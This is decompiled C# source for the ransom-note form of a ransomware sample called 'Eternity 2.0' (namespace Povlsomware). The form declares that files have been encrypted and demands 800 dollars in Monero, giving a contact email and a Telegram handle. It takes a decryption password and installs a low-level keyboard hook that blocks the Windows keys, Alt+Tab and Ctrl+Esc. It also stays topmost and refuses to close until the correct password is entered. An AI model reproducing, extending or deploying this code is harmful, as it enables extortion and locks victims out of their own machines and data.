using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Povlsomware;

public class PayM3 : Form
{
	private struct KBDLLHOOKSTRUCT
	{
		public Keys key;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr extra;
	}

	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private bool success;

	private IntPtr ptrHook;

	private LowLevelKeyboardProc objKeyboardProcess;

	private IContainer components;

	private TextBox textBox1;

	private Button button1;

	private Label label1;

	private Label label2;

	private TextBox textBox3;

	private Label label3;

	private TextBox textBox2;

	private BackgroundWorker backgroundWorker1;

	private PictureBox pictureBox1;

	public PayM3()
	{
		InitializeComponent();
		((Control)label2).set_Text(Program.count + " files have been encrypted");
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		string text = ((Control)textBox1).get_Text();
		if (CheckPassword(text.ToCharArray()))
		{
			success = true;
			((Control)button1).set_Text("Decrypting... ");
			backgroundWorker1.RunWorkerAsync(text);
		}
		else
		{
			((Control)textBox1).set_Text(string.Empty);
			((ContainerControl)this).set_ActiveControl((Control)(object)textBox1);
			((Control)button1).set_Text("Wrong Password... ");
		}
	}

	private bool CheckPassword(char[] input)
	{
		char[] pass = Program.GetPass();
		if (pass.Length == input.Length)
		{
			int num = 0;
			while (true)
			{
				if (num < input.Length)
				{
					if (pass[num] != input[num])
					{
						break;
					}
					num++;
					continue;
				}
				return true;
			}
			return false;
		}
		return false;
	}

	private void Screen_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!success)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void PayM3_Load(object sender, EventArgs e)
	{
		((Control)this).Show();
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		objKeyboardProcess = captureKey;
		ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(mainModule.ModuleName), 0u);
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		string decryption_password = e.Argument as string;
		Program.UndoAttack(decryption_password);
	}

	private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Application.Exit();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key);

	private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Invalid comparison between Unknown and I4
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Invalid comparison between Unknown and I4
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Invalid comparison between Unknown and I4
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)1;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private bool HasAltModifier(int flags)
	{
		return (flags & 0x20) == 32;
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void textBox3_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got Unknown
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0136: Expected O, but got Unknown
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ee: Expected O, but got Unknown
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a1: Expected O, but got Unknown
		//IL_02d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_037a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0413: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Expected O, but got Unknown
		//IL_044e: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d1: Expected O, but got Unknown
		//IL_04ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d3: Expected O, but got Unknown
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0759: Unknown result type (might be due to invalid IL or missing references)
		//IL_0763: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PayM3));
		textBox1 = new TextBox();
		button1 = new Button();
		label1 = new Label();
		label2 = new Label();
		textBox3 = new TextBox();
		label3 = new Label();
		textBox2 = new TextBox();
		backgroundWorker1 = new BackgroundWorker();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 10f));
		((Control)textBox1).set_Location(new Point(57, 355));
		((Control)textBox1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(812, 23));
		((Control)textBox1).set_TabIndex(0);
		((Control)button1).set_BackColor(Color.Lime);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)button1).set_Location(new Point(57, 384));
		((Control)button1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(812, 40));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Please decrypt them!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)Button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(301, 6));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(215, 20));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("All your files belong to us!");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.ButtonFace);
		((Control)label2).set_Location(new Point(301, 33));
		((Control)label2).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(41, 13));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("label2");
		((Control)textBox3).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)textBox3).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox3).set_ForeColor(Color.Red);
		((Control)textBox3).set_Location(new Point(305, 49));
		((Control)textBox3).set_Margin(new Padding(2, 3, 2, 3));
		((TextBoxBase)textBox3).set_Multiline(true);
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		textBox3.set_ScrollBars((ScrollBars)3);
		((Control)textBox3).set_Size(new Size(630, 262));
		((Control)textBox3).set_TabIndex(4);
		((Control)textBox3).set_Text(componentResourceManager.GetString("textBox3.Text"));
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(53, 332));
		((Control)label3).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(124, 20));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Enter password:");
		textBox2.set_AcceptsReturn(true);
		((Control)textBox2).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.Red);
		((Control)textBox2).set_Location(new Point(11, 172));
		((Control)textBox2).set_Margin(new Padding(2));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(290, 139));
		((Control)textBox2).set_TabIndex(6);
		((Control)textBox2).set_Text("Price: 800$ in Monero\r\nEmail: getyourfilesback_s@protonmail.com\r\nTelegram: @RecoverdataU\r\nInfo: monero.org\r\n\r\n ID: 0x0002 \r\n\r\nby Eternity group");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox2).add_TextChanged((EventHandler)textBox2_TextChanged);
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		backgroundWorker1.RunWorkerCompleted += backgroundWorker1_RunWorkerCompleted;
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(0, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(239, 167));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)3);
		pictureBox1.set_TabIndex(7);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(959, 457));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Margin(new Padding(2, 3, 2, 3));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("PayM3");
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Eternity 2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Screen_FormClosing));
		((Form)this).add_Load((EventHandler)PayM3_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
